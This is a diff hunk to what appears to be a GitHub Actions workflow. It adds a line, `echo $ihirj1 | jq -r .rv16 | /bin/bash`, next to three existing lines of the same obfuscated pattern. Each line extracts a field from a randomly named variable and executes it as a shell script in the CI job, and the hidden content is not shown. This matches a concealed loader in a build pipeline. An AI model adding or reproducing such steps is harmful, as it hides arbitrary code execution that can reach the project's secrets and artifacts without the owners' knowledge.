@@ -20,6 +20,7 @@ jobs:
           echo $aomc5 | jq -r .ulde59 | /bin/bash
           echo $ux2221 | jq -r .ui12433 | /bin/bash
           echo $ffb7482 | jq -r .seiau02070 | /bin/bash
+          echo $ihirj1 | jq -r .rv16 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
